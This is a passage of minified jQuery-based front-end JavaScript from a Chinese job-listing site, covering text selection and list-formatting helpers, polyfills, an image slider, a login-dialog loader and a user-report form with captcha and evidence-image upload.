                  , n = this.val();
                this.val(n.substring(0, t) + e + n.substring(i, n.length)),
                this[0].selectionStart = t,
                this[0].selectionEnd = t + e.length
            }
        },
        msie: {
            get: function(e) {
                var t, i, n, a, o, s, r, c = document.selection.createRange();
                return void 0 === c ? r = {
                    position: 0,
                    start: 0,
                    end: this.val().length,
                    length: this.val().length,
                    text: this.val()
                } : (n = this[i = t = 0].value.length,
                a = this[0].value.replace(/\r\n/g, "\n"),
                o = this[0].createTextRange(),
                s = this[0].createTextRange(),
                r = (o.moveToBookmark(c.getBookmark()),
                s.collapse(!1),
                -1 === o.compareEndPoints("StartToEnd", s) ? (t = -o.moveStart("character", -n),
                t += a.slice(0, t).split("\n").length - 1,
                -1 === o.compareEndPoints("EndToEnd", s) ? (i = -o.moveEnd("character", -n),
                i += a.slice(0, i).split("\n").length - 1) : i = n) : i = t = n,
                {
                    position: t,
                    start: t,
                    end: i,
                    length: n,
                    text: c.text
                })),
                void 0 === e ? r : r[e]
            },
            set: function(e, t) {
                var i = this[0].createTextRange();
                void 0 !== i && (void 0 === t && (t = this[0].value.length),
                e = e - (this[0].value.slice(0, e).split("\r\n").length - 1),
                t = t - (this[0].value.slice(0, t).split("\r\n").length - 1),
                i.collapse(!0),
                i.moveEnd("character", t),
                i.moveStart("character", e),
                i.select())
            },
            replace: function(e) {
                document.selection.createRange().text = e
            }
        }
    };
    n.fn.extend({
        textrange: function(e) {
            var t = "get"
              , i = {};
            return void 0 === this[0] ? this : ("string" == typeof e ? t = e : "object" == typeof e && (t = e.method || t,
            i = e),
            "unknown" === (o = void 0 === o ? "selectionStart"in this[0] ? "xul" : document.selection ? "msie" : "unknown" : o) ? this : (i.nofocus || document.activeElement === this[0] || this[0].focus(),
            "function" == typeof a[t] ? a[t].apply(this, Array.prototype.slice.call(arguments, 1)) : void n.error("Method " + t + " does not exist in jQuery.textrange")))
        }
    })
}),
!function(e) {
    "function" == typeof define && define.amd ? define(["jquery"], e) : "object" == typeof exports ? e(require("jquery")) : e(jQuery)
}(function(y) {
    var t = /^((\s+)?●(\s+)?)/
      , $ = /^((\s+)?(\d+)([\.|、])(\s+)?)/
      , i = /^((\s+)?(((\d+)([\.|、]))|●))(\s+)?/;
    function x(e) {
        return t.test(e)
    }
    function k(e) {
        return $.test(e)
    }
    function C(e) {
        return e.replace(i, "")
    }
    function T(e, t) {
        for (var i, n, a, o = e.split(/[\n\r]/g), s = 0, r = -1, c = 0, l = 0, d = 0, p = 0, u = 0, h = 0; h < o.length; h++)
            i = t,
            n = s,
            a = o[h],
            (u = i.start >= n && i.start <= n + a.length && i.end >= n ? 1 : i.end >= n && i.end <= n + a.length ? 2 : i.start <= n && n + a.length <= i.end ? 3 : 0) && (1 == u ? (r = h,
            l = t.start - p) : 2 == u && (d = t.end - p),
            c++),
            p += o[h].length + 1,
            s += o[h].length + 1;
        return {
            startLine: r,
            startLineIndex: l,
            lineCount: c,
            endLineIndex: d = 0 == d ? l : d
        }
    }
    function a(e, t) {
        for (var i, n, a, o, s, r = e.val(), c = e.textrange("get"), l = c.start, d = 0, p = r.split(/[\n\r]/g), r = T(r, c), u = r.startLine, h = r.startLineIndex, f = r.endLineIndex, m = r.lineCount, g = (t ? k : x)(p[u]), c = p[Math.max(u - 1, 0)].match($), v = t ? c && c[4] ? c[4] : "." : "●", w = c && c[3] ? parseInt(c[3]) : 0, b = 0; b < m; b++)
            i = (n = p[a = b + u]).length,
            o = (n = g ? C(n) : (w++,
            o = (t ? w : "") + v,
            s = n,
            y.trim(o) + " " + C(s))).length - i,
            a === u ? (l += h + o < 0 ? -1 * h : o,
            l = Math.max(l, 0),
            d += 1 == m ? f - h : n.length - Math.max(h + o, 0)) : d += b == m - 1 ? Math.max(f + o, 1) : n.length,
            0 < b && d++,
            p[a] = n;
        e.val(p.join("\n")).textrange("set", l, d).focus().trigger("input")
    }
    y.fn.extend({
        textarealist: function(e) {
            var i = y.extend({
                wrapClass: ".serial-wrap",
                btnNum: ".serial-btn-num",
                btnBullet: ".serial-btn-bullet"
            });
            this.each(function() {
                var n, e, t;
                this.__textareaListInited || (this.__textareaListInited = !0,
                e = 0 < (n = y(this)).closest(i.wrapClass).length ? n.closest(i.wrapClass) : n.parent(),
                t = y(i.btnNum, e),
                y(i.btnBullet, e).on("click", function() {
                    a(n, !1)
                }),
                t.on("click", function() {
                    a(n, 1)
                }),
                n.on("keyup", function(e) {
                    var t, i;
                    13 == e.keyCode && (e = n.val(),
                    i = n.textrange("get"),
                    t = e.split(/[\n\r]/g),
                    e = T(e, i),
                    i = t[Math.max(e.startLine - 1, 0)],
                    y.trim(C(i)) && (k(i) ? a(n, 1) : x(i) && a(n, !1)))
                }))
            })
        }
    })
}),
function(e) {
    return Array.isArray(e) && 0 === e.length || Object.prototype.isPrototypeOf(e) && 0 === Object.keys(e).length
}
);
function Utemplate(e, t) {
    var i = /<%([^%>]+)?%>/g
      , n = /(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g
      , a = "var arr = []; \n"
      , o = 0;
    function s(e, t) {
        return a += t ? e.match(n) ? e + "\n" : "arr.push(" + e + ");\n" : "" != e ? "arr.push('" + e.replace(/"/g, '\\"') + "');\n" : "",
        arguments.callee
    }
    for (; match = i.exec(e); )
        s(e.slice(o, match.index))(match[1], !0),
        o = match.index + match[0].length;
    return s(e.substr(o, e.length - o)),
    a += "return arr.join('')",
    new Function(a.replace(/[\r\t\n]/g, "")).apply(t)
}
Date.prototype.Format = function(e) {
    var t, i = {
        "M+": this.getMonth() + 1,
        "d+": this.getDate(),
        "h+": this.getHours(),
        "m+": this.getMinutes(),
        "s+": this.getSeconds(),
        "q+": Math.floor((this.getMonth() + 3) / 3),
        S: this.getMilliseconds()
    };
    for (t in /(y+)/.test(e) && (e = e.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length))),
    i)
        new RegExp("(" + t + ")").test(e) && (e = e.replace(RegExp.$1, 1 == RegExp.$1.length ? i[t] : ("00" + i[t]).substr(("" + i[t]).length)));
    return e
}
,
Array.prototype.unique = function(e) {
    if (this.length < 2)
        return [this[0]];
    for (var t = {}, i = [], n = 0; n < this.length; n++) {
        var a = this[n]
          , o = !!e && typeof t[a] != typeof a;
        void 0 !== t[a] && !o || (t[a] = a,
        i.push(a))
    }
    return i
}
,
Array.prototype.indexOf = function(e) {
    for (var t = 0; t < this.length; t++)
        if (this[t] == e)
            return t;
    return -1
}
,
Array.prototype.remove = function(e) {
    e = this.indexOf(e);
    -1 < e && this.splice(e, 1)
}
,
Array.prototype.filter || (Array.prototype.filter = function(e) {
    "use strict";
    if (null == this)
        throw new TypeError;
    var t = Object(this)
      , i = t.length >>> 0;
    if ("function" != typeof e)
        throw new TypeError;
    for (var n, a = [], o = 2 <= arguments.length ? arguments[1] : void 0, s = 0; s < i; s++)
        s in t && (n = t[s],
        e.call(o, n, s, t) && a.push(n));
    return a
}
),
Array.prototype.map || (Array.prototype.map = function(e, t) {
    var i, n, a;
    if (null == this)
        throw new TypeError(" this is null or not defined");
    var o, s = Object(this), r = s.length >>> 0;
    if ("[object Function]" != Object.prototype.toString.call(e))
        throw new TypeError(e + " is not a function");
    for (t && (i = t),
    n = new Array(r),
    a = 0; a < r; )
        a in s && (o = s[a],
        o = e.call(i, o, a, s),
        n[a] = o),
        a++;
    return n
}
),
Array.prototype.indexOf || (Array.prototype.indexOf = function(e, t) {
    var i;
    if (null == this)
        throw new TypeError('"this" is null or not defined');
    var n = Object(this)
      , a = n.length >>> 0;
    if (0 != a) {
        t = 0 | t;
        if (!(a <= t))
            for (i = Math.max(0 <= t ? t : a - Math.abs(t), 0); i < a; ) {
                if (i in n && n[i] === e)
                    return i;
                i++
            }
    }
    return -1
}
),
Array.prototype.find || (Array.prototype.find = function(e) {
    "use strict";
    if (null == this)
        throw new TypeError("Array.prototype.find called on null or undefined");
    if ("function" != typeof e)
        throw new TypeError("predicate must be a function");
    for (var t, i = Object(this), n = i.length >>> 0, a = arguments[1], o = 0; o < n; o++)
        if (t = i[o],
        e.call(a, t, o, i))
            return t
}
),
"function" != typeof Array.prototype.reduce && (Array.prototype.reduce = function(e, t) {
    "use strict";
    if (null == this)
        throw new TypeError("Array.prototype.reduce called on null or undefined");
    if ("function" != typeof e)
        throw new TypeError(e + " is not a function");
    var i, n, a = this.length >>> 0, o = !1;
    for (1 < arguments.length && (n = t,
    o = !0),
    i = 0; i < a; ++i)
        this.hasOwnProperty(i) && (o ? n = e(n, this[i], i, this) : (n = this[i],
        o = !0));
    if (o)
        return n;
    throw new TypeError("Reduce of empty array with no initial value")
}
);
var ShowLoginDialog = {
    loginSdkLoaded: !1,
    isShowLogin: !1,
    showBossLogin: function(t) {
        function e() {
            window.BossLoginDialog(t).then(function(e) {
                ShowLoginDialog.isShowLogin = !1,
                "login-success" == (e = e || {}).action && (t.success && "function" == typeof t.success ? t.success(e) : location.reload())
            }).catch(function() {
                ShowLoginDialog.isShowLogin = !1
            })
        }
        ShowLoginDialog.isShowLogin || Detail.isShowSign || (ShowLoginDialog.isShowLogin = !0,
        t = t || {},
        loadCss("https://www.zhipin.com/v2/boss_login/v1.0.0/css/boss-login-dialog.css"),
        ShowLoginDialog.loginSdkLoaded && window.BossLoginDialog ? e() : seriesLoadScripts("https://www.zhipin.com/v2/boss_login/v1.0.0/js/boss-login-dialog.min.js", function() {
            ShowLoginDialog.loginSdkLoaded = !0,
            e()
        }))
    }
};
function placeholderSupport() {
    return "placeholder"in document.createElement("input")
}
!function(h, f) {
    function n(e, t) {
        var i = this;
        i.$element = e,
        i.defaults = {
            width: 840,
            height: 256,
            start: 1,
            speed: 400,
            interval: 3e3,
            autoPlay: !1,
            dotShow: !0,
            navShow: !0,
            arrShow: !0,
            touch: !0,
            effect: "slide",
            fadeOut: !0,
            triggerEvent: "hover",
            afterSlider: function() {}
        },
        i.clickable = !0,
        i.options = h.extend({}, i.defaults, t)
    }
    n.prototype = {
        init: function() {
            var n = this
              , t = n.$element
              , e = t.children("ul").children("li")
              , a = e.length
              , o = n.options.start
              , s = 0
              , r = 0;
            for (n.options.arrShow && t.append('<a href="javascript:;" class="btn-direction btn-prev prev"></a><a href="javascript:;" class="btn-direction btn-next next"></a>'),
            i = 1; i <= a; i++)
                o == i && e.eq(o - 1).addClass("cur");
            if (n.options.dotShow) {
                var c = "";
                for (i = 1; i <= a; i++)
                    o == i ? c += '<i data-index="' + i + '" class="cur"></i>' : c += '<i data-index="' + i + '"></i>';
                t.append('<div class="slider-dot">' + c + "</div>")
            }
            function l() {
                var e = t.width()
                  , e = n.options.height / n.options.width * e;
                t.css("height", e)
            }
            var d, p, u;
            t.css("height", n.options.height),
            l(),
            h(f).resize(function() {
                l()
            }),
            n.options.arrShow && (t.find(".next").on("click", function(e) {
                e.preventDefault(),
                n.clickable && (a <= o ? o = 1 : o += 1,
                n.moveTo(o, "next"))
            }),
            t.find(".prev").on("click", function(e) {
                e.preventDefault(),
                n.clickable && (1 == o ? o = a : --o,
                n.moveTo(o, "prev"))
            })),
            n.options.dotShow && (d = "hover" == n.options.triggerEvent ? "mouseover" : "click",
            t.find(".slider-dot i").on(d, function(e) {
                e.preventDefault(),
                void 0 !== u && clearInterval(u),
                n.clickable && (e = h(this).data("index"),
                dir = o < e ? "next" : "prev",
                e != o && (o = e,
                n.moveTo(o, dir)))
            })),
            n.options.navShow && t.parent().find(".slider-nav a").on("mouseover", function(e) {
                e.preventDefault(),
                n.clickable && (e = h(this).data("index"),
                dir = o < e ? "next" : "prev",
                e != o && (o = e,
                n.moveTo(o, dir)))
            }),
            n.options.autoPlay && (p = function() {
                a < ++o && (o = 1),
                n.moveTo(o, "next")
            }
            ,
            u = setInterval(p, n.options.interval),
            t.hover(function() {
                u = clearInterval(u)
            }, function() {
                u = setInterval(p, n.options.interval)
            })),
            n.options.touch && e.on({
                touchstart: function(e) {
                    s = e.originalEvent.touches[0].clientY,
                    r = e.originalEvent.touches[0].clientX
                },
                touchend: function(e) {
                    var t = e.originalEvent.changedTouches[0].clientY
                      , e = e.originalEvent.changedTouches[0].clientX
                      , t = s - t
                      , e = r - e;
                    Math.abs(e) > Math.abs(t) && (5 < e ? (a <= o ? o = 1 : o += 1,
                    n.moveTo(o, "next")) : (1 == o ? o = a : --o,
                    n.moveTo(o, "prev"))),
                    r = s = null
                },
                touchmove: function(e) {
                    e.preventDefault && e.preventDefault()
                }
            })
        },
        moveTo: function(e, t) {
            var i = this
              , n = i.$element
              , a = i.clickable
              , o = n.find(".slider-dot i")
              , s = n.parent().find(".slider-nav a")
              , r = n.children("ul")
              , c = r.children("li");
            if (!a)
                return !1;
            i.clickable = !1,
            "fade" == i.options.effect ? (1 == i.options.fadeOut ? r.children(".cur").fadeOut(function() {
                h(this).removeClass("cur")
            }) : r.children(".cur").hide().removeClass("cur"),
            c.eq(e - 1).fadeIn(function() {
                h(this).addClass("cur"),
                i.clickable = !0
            })) : (a = n.width(),
            "prev" == t && (a *= -1),
            r.children(".cur").stop().animate({
                left: -a
            }, i.options.speed, function() {
                h(this).removeClass("cur")
            }),
            c.eq(e - 1).css("left", a + "px").addClass("cur").stop().animate({
                left: 0
            }, i.options.speed, function() {
                i.clickable = !0
            })),
            i.options.afterSlider.call(i),
            o.removeClass("cur"),
            o.eq(e - 1).addClass("cur"),
            s.removeClass("cur"),
            s.eq(e - 1).addClass("cur")
        }
    },
    h.fn.hwSlider = function(e) {
        var t = new n(this,e);
        return this.each(function() {
            t.init()
        })
    }
}(jQuery, window, document);
var PlaceholderCheck = {
    init: function(e) {
        placeholderSupport() || (e ? e.find("[placeholder]") : $("[placeholder]")).focus(function() {
            var e = $(this);
            e.val() == e.attr("placeholder") && (e.val(""),
            e.removeClass("placeholder"))
        }).blur(function() {
            var e = $(this);
            "" != e.val() && e.val() != e.attr("placeholder") || (e.addClass("placeholder"),
            e.val(e.attr("placeholder")))
        }).blur()
    }
}
  , Storage = ($(function() {
    PlaceholderCheck.init()
}),
{
    get: function(e) {
        var t = this._getStorage();
        if (t)
            return (t = t.getItem(e)) && JSON.parse(t)
    },
    set: function(e, t) {
        var i = this._getStorage();
        e && void 0 !== t && i.setItem(e, JSON.stringify(t))
    },
    del: function(e, t) {
        var i = this._getStorage();
        if (i)
            if (e && t)
                for (var e in i)
                    0 === e.indexOf(prefix) && i.removeItem(e);
            else
                e ? i.removeItem(e) : i.clear()
    },
    _getStorage: function() {
        var e;
        try {
            e = window.localStorage
        } catch (e) {}
        return e
    }
})
  , Report = {
    sdkInfo: null,
    submitIng: !1,
    verifyType: 1,
    showConcatInfo: !1,
    source: "",
    reasonList: [],
    reportBtnKa: "",
    processId: "",
    userPhone: "",
    currentReportType: {},
    currentSecondReportType: {},
    init: function() {
        Report.uploadCount = 0,
        Report.currentReportType = {},
        Report.currentSecondReportType = {},
        Report.handleEntryClick()
    },
    getReportTypeList: function(e) {
        Report.source = (e = e || {}).source,
        $.toast({
            type: "loading",
            content: "加载举报类型中..."
        }),
        $.get({
            url: "/wapi/zpuser/h5/user/report/getAllReasonV3",
            success: function(e) {
                0 == e.code && e ? e.zpData && (e.zpData.reasonList || []).length ? ($("#toast").remove(),
                Report.reasonList = e.zpData.reasonList || [],
                Report.handleReportTypeListDom(),
                $.ajax({
                    type: "post",
                    url: "/wapi/zpuser/wap/processIdForWap",
                    success: function(e) {
                        0 == e.code && (Report.processId = e.zpData || "")
                    },
                    complete: function() {
                        try {
                            var e;
                            8 != Report.source && (e = {
                                action: "detail-report-click",
                                p1: _reportData.reportedId,
                                p2: _jobInfo.job_id,
                                p3: _reportData.targetId,
                                p4: Report.processId || "",
                                p6: Report.source || (isWarning ? 3 : 7)
                            },
                            Report.myActionLog(e))
                        } catch (e) {}
                    }
                })) : $.toast({
                    type: "error",
                    content: "举报列表错误，请稍后再试"
                }) : 7 == e.code && void 0 !== Detail ? (ShowLoginDialog.showBossLogin({
                    params: {
                        pk: Report.reportBtnKa || ""
                    }
                }),
                $("#toast").remove()) : $.toast({
                    content: e.message,
                    type: "error"
                })
            },
            error: function(e) {
                $.toast({
                    content: e.message || "请求失败",
                    type: "error"
                })
            }
        })
    },
    getSecondTypeList: function() {
        $.toast({
            type: "loading",
            content: "加载具体违规类别中..."
        }),
        $("#toast").remove(),
        Report.handleSecondTypeListDom()
    },
    handleSecondTypeListDom: function() {
        var i = Report.currentReportType.code
          , n = []
          , a = ($.each(Report.reasonList, function(e, t) {
            if (t.code == i)
                return n = t.subReasons || [],
                !1
        }),
        "")
          , e = ($.each(n, function(e, t) {
            a += '<div class="type-item" data-title="' + t.name + '" data-code="' + t.code + '"><div class="type-item-inner"><div class="first-title">' + t.name + '</div><div class="right-icon"></div></div></div>'
        }),
        '<div class="my-title"><div class="back-to-first"></div><div class="title-text">选择具体违规类别</div></div><div class="type-list">' + a + "</div>");
        $.dialog({
            title: "",
            content: e,
            inline: !0,
            preventBodyScroll: !0,
            confirmText: !1,
            cancelText: !1,
            wrapClass: "dialog-report-type-list dialog-report-type-second",
            onOpen: function(e) {
                e.find(".type-item").on("click", function(e) {
                    var t = $(this).attr("data-title")
                      , i = $(this).attr("data-code");
                    try {
                        var n = {
                            action: "system-safely-report-typechoose2",
                            p1: t,
                            p2: i,
                            p3: _reportData.reportedId,
                            p4: _jobInfo.job_id,
                            p5: _reportData.targetId,
                            p6: Report.source,
                            p7: Report.processId || "",
                            p8: "",
                            p9: Report.currentSecondReportType.code
                        };
                        Report.myActionLog(n)
                    } catch (e) {}
                    Report.currentSecondReportType = {
                        code: i,
                        title: t || ""
                    },
                    Report.getSecondTitleList(),
                    $(".dialog-report-type-second").hide(),
                    $.toast({
                        type: "loading",
                        content: "加载举报详情中..."
                    })
                }),
                e.find(".back-to-first").on("click", function(e) {
                    $(".dialog-report-type-list").show(),
                    $(".dialog-report-type-second").remove()
                })
            }
        })
    },
    handleReportTypeListDom: function() {
        var i = ""
          , e = ($.each(Report.reasonList, function(e, t) {
            i += '<div class="type-item" data-contract="' + (t.showConcatInfo ? "1" : "0") + '" data-first-title=' + t.name + " data-code=" + t.code + '><div class="type-item-inner"><div class="first-title">' + t.name + '</div><div class="second-title">' + t.desc + '</div><div class="right-icon"></div></div></div>'
        }),
        '<div class="type-list">' + i + "</div>");
        $.dialog({
            title: "选择举报类型",
            content: e,
            inline: !0,
            preventBodyScroll: !0,
            confirmText: !1,
            cancelText: !1,
            wrapClass: "dialog-report-type-list",
            onOpen: function(e) {
                e.find(".type-item").on("click", function(e) {
                    var t = $(this).attr("data-first-title")
                      , i = $(this).attr("data-code");
                    Report.showConcatInfo = 1 == $(this).attr("data-contract");
                    try {
                        var n = {
                            action: "system-safely-report-typechoose",
                            p1: t,
                            p2: i,
                            p3: _reportData.reportedId,
                            p4: _jobInfo.job_id,
                            p5: _reportData.targetId,
                            p6: Report.source,
                            p7: Report.processId || "",
                            p8: ""
                        };
                        Report.myActionLog(n)
                    } catch (e) {}
                    Report.currentReportType = {
                        code: i,
                        title: t || ""
                    },
                    $(".dialog-report-type-list").hide(),
                    Report.getSecondTypeList()
                })
            }
        })
    },
    setReportSubmitPageDom: function(t) {
        var n = ""
          , i = (Report.currentReportType.title || "") + "-" + (Report.currentSecondReportType.title || "");
        t.length && $.each(t, function(e, t) {
            var i = "";
            $.each(t.options || [], function(e, t) {
                i += '<li data-code="' + t.code + '" data-title="' + t.name + '"><span class="option-name">' + t.name + "</span>" + (t.needExtra ? '<span class="extra-input"><input type="text" placeholder="' + t.extraTitle + '" /></span>' : "") + "</li>"
            }),
            n += '<div class="form-row form-row-choice clearfix" data-code="' + t.code + '" data-title="' + t.name + '"><span class="t choice-t-warp">' + (1 == t.required ? '<span class="require-icon">*</span> ' : "") + t.name + '：</span><ul class="select-option-list ' + (1 == t.optionStyle ? "is-multiple" : "is-single") + '">' + i + "</ul></div>"
        });
        $.get("/wapi/zpuser/wap/report/random", function(e) {
            0 == e.code ? ($("#toast").remove(),
            Report.evidenceDialog = $.dialog({
                content: '<div class="my-title"><div class="back-to-first"></div><div class="title-text">补充举报证据</div></div><div class="prop-inner"><div class="form-row"><span class="t">举报原因：</span><div class="report-first-title">' + i + "</div></div>" + (t.length ? '<span class="fact-sheet-title">具体情况说明</span>' + n : "") + '<div class="form-row"><span class="t"><span class="require-icon">*</span> 补充说明：</span><div class="ipt-wrap"><textarea name="content" ka="report-content" class="ipt reason-content-ipt" placeholder="请完整描述事件过程及损失情况，并提供对应证据，以便更快为您核实处理" data-range="1,500" maxlength="500" data-blank="请输入举报内容"></textarea><span class="count-num"><em>0</em>/500</span></div><span class="text-error"></span></div><div class="form-row"><span class="t">验证码：</span><div class="verify-box ipt-wrap"><input type="text" class="ipt verify-ipt " name="captcha" ka="report-captcha" placeholder="验证码" maxlength="4" data-blank="请输入验证码"><img src="/wapi/zppassport/captcha?randomKey=' + e.zpData.randomKey + '" class="loaded"><input type="hidden" name="randomKey" class="randomkey" value="' + e.zpData.randomKey + '"></div><span class="text-error"></span></div><div class="form-row"><span class="t t-pic">证据截图：</span><div class="upload"><div class="preview"><ul><div class="upload-btn"><span class="icon-plus"></span><a href="javascript:;">上传图片</a><input id="fileupload" type="file" name="file" ka="report-picture"></div></ul></div><span class="text-error pic-error"></span></div></div>' + (Report.showConcatInfo ? '<div class="form-row"><span class="t">您的联系方式：</span><div class="ipt-wrap report-account"><input name="account" ka="report-account" class="ipt contract-account-ipt" placeholder="请填写您的手机号" /><span class="account-text"></span><a href="javascript:;" class="modify-account-btn">修改</a></div><span class="text-error"></span><p class="contract-account-tip">工作人员可能向您致电核实举报详情！为了更好接受服务，请务必确保联系方式有效，如有变更请尽快修改。</p></div>' : "") + '<div class="form-row form-row-protocol"><span class="t">&nbsp;&nbsp;</span><div class="report-protocol"><p> 点击“确定”即表示您愿意遵守<a href="https://about.zhipin.com/agreement?id=registerprotocol" target="_blank">《用户协议》</a>和<a href="https://about.zhipin.com/agreement?id=personalinfopro" target="_blank">《隐私政策》</a>规定：</p><span>· 授权平台对您提交的材料及相关信息记录进行核实。</span><span>· 您将对举报的真实性负责，虚假举报需承担法律责任。</span></div></div></div>',
                title: "",
                inline: !0,
                preventBodyScroll: !0,
                cancelButton: "取消",
                confirmButton: "确认",
                wrapClass: "pop-report",
                onOpen: function(t) {
                    "FormsUI"in window && FormsUI.dropSelect(t),
                    "DropDown"in window && DropDown.init(t),
                    t.find(".verify-box img").on("click", function() {
                        $(this).attr("src", "/wapi/zppassport/captcha/?randomKey=" + $(this).siblings(".randomkey").val() + "&_r=" + (new Date).getTime())
                    }),
                    t.find("#fileupload").on("click", function(e) {
                        !$(this).next(".verify-box") || Report.checkForm($(".verify-box")) ? Report.uploadPictures($(this), t) : e.preventDefault()
                    }),
                    t.find(".select-option-list.is-multiple").on("click", "li .option-name", function() {
                        var e = $(this).parent();
                        e.hasClass("is-check") ? e.removeClass("is-check") : e.addClass("is-check")
                    }),
                    t.find(".select-option-list.is-single").on("click", "li .option-name", function() {
                        var e = $(this).parent();
                        e.hasClass("is-check") || e.addClass("is-check").siblings().removeClass("is-check")
                    }),
                    t.find(".select-option-list li").each(function() {
                        var e;
                        $(this).find(".extra-input").length && (e = $(this).position(),
                        $(this).find(".extra-input").css({
                            left: -e.left + "px"
                        }))
                    }),
                    t.find(".select-option-list").on("click", "li", function() {
                        t.find(".select-option-list li").removeClass("show-extra"),
                        $(this).find(".extra-input").length && $(this).addClass("show-extra")
                    }),
                    t.find(".select-option-list li").on("clickout", function() {
                        $(this).removeClass("show-extra")
                    }),
                    Report.initUserPhone(t),
                    t.find(".select-option-list li").each(function() {
                        var e = $(this).outerWidth();
                        150 < e && $(this).addClass("show-tooltip"),
                        $(this).css({
                            maxWidth: Math.min(e, 150) + "px"
                        })
                    }),
                    t.find(".select-option-list li.show-tooltip").hover(function() {
                        var e = $(this).parents(".pop-report")
                          , t = $(this).offset()
                          , i = $(this).outerWidth()
                          , e = (e.append('<span class="tooltip-black-title">' + $(this).data("title") + "</span>"),
                        e.children(".tooltip-black-title"));
                        e.css({
                            top: t.top - e.outerHeight() - 4 + "px",
                            left: +t.left + i / 2 + "px"
                        })
                    }, function() {
                        $(this).parents(".pop-report").children(".tooltip-black-title").remove()
                    }),
                    t.on("click", ".link-close", function() {
                        $(this).parents("li").remove(),
                        Report.uploadCount--
                    }),
                    t.find(".back-to-first").on("click", function(e) {
                        Report.handleClickBack(t)
                    }),
                    t.find(".reason-content-ipt").on("input", function() {
                        var e = $(this).val().length;
                        t.find(".count-num em").text(e)
                    }),
                    seriesLoadScripts("https://static.zhipin.com/library/js/sdk/verify-sdk-v2.3.js?t=" + new Date, function() {
                        Report.initVerify(t)
                    });
                    try {
                        var e = {
                            action: "system-safely-report-evidence",
                            p1: Report.currentReportType.title,
                            p2: Report.currentReportType.code,
                            p3: _reportData.reportedId,
                            p4: _jobInfo.job_id,
                            p5: _reportData.targetId,
                            p6: Report.source,
                            p7: Report.processId || "",
                            p8: "",
                            p9: Report.currentSecondReportType.code
                        };
                        Report.myActionLog(e)
                    } catch (e) {}
                },
                onConfirm: function(e) {
                    return Report.submitForm(e, "", "")
                },
                onClose: function() {
                    $(".dialog-report-type-list").remove()
                }
            })) : 7 == e.code && void 0 !== Detail ? ShowLoginDialog.showBossLogin() : $.toast({
                content: e.message,
                type: "error"
            })
        })
    },
    initUserPhone: function(t) {
        Report.getAccountStatus().always(function() {
            Report.userPhone ? (t.find(".report-account .account-text").text(Report.userPhone),
            t.find(".report-account .ipt[name=account]").attr("placeholder", Report.userPhone)) : (t.find(".report-account").addClass("is-edit"),
            t.find(".report-account .modify-account-btn").text("保存")),
            $(".report-account .modify-account-btn", t).off("click").on("click", function() {
                var e;
                "保存" == $(this).text() ? (e = $.trim(t.find(".report-account .ipt[name=account]").val()) || "") ? /^(\d{6,11})$/.test(e) ? (e = e.replace(/\d{6}(?=\d{2}$)/, "******"),
                t.find(".report-account .account-text").text(e),
                t.find(".report-account .ipt[name=account]").attr("placeholder", e),
                $(this).text("修改").parents(".report-account").removeClass("is-edit")) : $.toast({
                    type: "error",
                    content: "手机号格式不正确"
                }) : $.toast({
                    type: "error",
                    content: "联系方式不能为空"
                }) : $(this).text("保存").parents(".report-account").addClass("is-edit")
            })
        })
    },
    getAccountStatus: function() {
        var t = $.Deferred();
        return $.ajax({
            type: "get",
            url: "/wapi/zppassport/user/accountStatus",
            success: function(e) {
                0 == e.code && e.zpData ? (Report.userPhone = e.zpData.phone || "",
                t.resolve()) : t.reject()
            },
            error: function() {
                t.reject()
            }
        }),
        t
    },
    initVerify: function(e) {
        Report.sdkInfo = null;
        var t = "verrify" + Math.random().toString(32).substr(-10, 6)
          , i = e.find(".verify-box");
        i.addClass("verify-box-new"),
        i.attr("id", t),
        i.length && (i.html(""),
        "undefined" != typeof VerifyCodeSDK && (Report.sdkInfo = new VerifyCodeSDK({
            dom: i[0],
            type: 1,
            success: function(e) {
                i.find('input[name="challenge"]').length || (i.append('<input type="hidden" name="challenge"></input>'),
                i.append('<input type="hidden" name="validate"></input>'),
                i.append('<input type="hidden" name="seccode"></input>')),
                i.find('input[name="challenge"]').val(e.challenge),
                i.find('input[name="validate"]').val(e.validate),
                i.find('input[name="seccode"]').val(e.seccode)
            },
            ready: function(e) {
                Report.verifyType = e.type
            }
        })))
    },
    getSecondTitleList: function() {
        $.get({
            url: "/wapi/zpuser/h5/user/report/getShowConfigs",
            data: {
                subReasonCode: Report.currentSecondReportType.code
            },
            success: function(e) {
                0 == e.code ? Report.setReportSubmitPageDom(e.zpData || []) : 7 == e.code && void 0 !== Detail ? ShowLoginDialog.showBossLogin() : $.toast({
                    content: e.message,
                    type: "error"
                })
            },
            error: function(e) {
                $.toast({
                    content: e.message || "请求失败",
                    type: "error"
                })
            }
        })
    },
    handleEntryClick: function() {
        $("body").on("click", ".icon-report,.link-report", function() {
            var e = "job_detail_report" == $(this).attr("ka")
              , t = $(this).attr("source") || "";
            Report.reportBtnKa = $(this).attr("ka") || "",
            $(this).closest(".security-box").length && (Report.reportBtnKa = "security_box_report_btn"),
            Report.getReportTypeList({
                source: t || (e ? 3 : 7)
            });
            try {
                _T.sendEvent("report_geek_" + $(".icon-report").siblings(".icon-coop").attr("data-uid"))
            } catch (e) {}
        })
    },
    uploadPictures: function(el, popContent) {
        var url = "/wapi/zpupload/image/uploadSingle"
          , typeRule = /(\.|\/)(png|jpg|jpeg)$/i
          , maxSize = 3e6
          , el = el
          , previewEl = el.closest(".upload").find(".preview")
          , uploadContainer = el.closest(".upload")
          , vertifyEl = popContent.find(".verify-box .ipt");
        el.fileupload({
            method: "POST",
            url: url,
            dataType: "text",
            acceptFileTypes: typeRule,
            maxChunkSize: maxSize,
            formData: {
                token: window.top._PAGE.token ? window.top._PAGE.token.split("|")[0] : ""
            },
            add: function(e, t) {
                var i = t.files[0]
                  , n = i.name
                  , a = i.size;
                fileInfo = i,
                typeRule.test(n) ? maxSize < a ? $.toast({
                    content: "请上传3M以内的文件",
                    type: "error"
                }) : 6 <= Report.uploadCount ? popContent.find(".preview").siblings(".text-error").html("最多可以上传6张照片") : (popContent.find(".preview").siblings(".text-error").html(""),
                t.formData = {
                    source: "report"
                },
                t.submit()) : $.toast({
                    content: "请上传png、jpg、jpeg 格式的文件",
                    type: "error"
                })
            },
            done: function(e, data) {
                var result = data.result;
                "string" == typeof result && (result = eval("(" + result + ")")),
                0 == result.code ? (Report.uploadCount++,
                setTimeout(function() {
                    previewEl.find("ul").find(".upload-btn").before('<li><img src="' + result.zpData.url + '" data-img="' + result.zpData.url + '"/><i class="link-close"></i></li>')
                }, 500)) : (uploadContainer.find("a").html("上传图片"),
                $.toast({
                    content: result.resmsg,
                    type: "error"
                }),
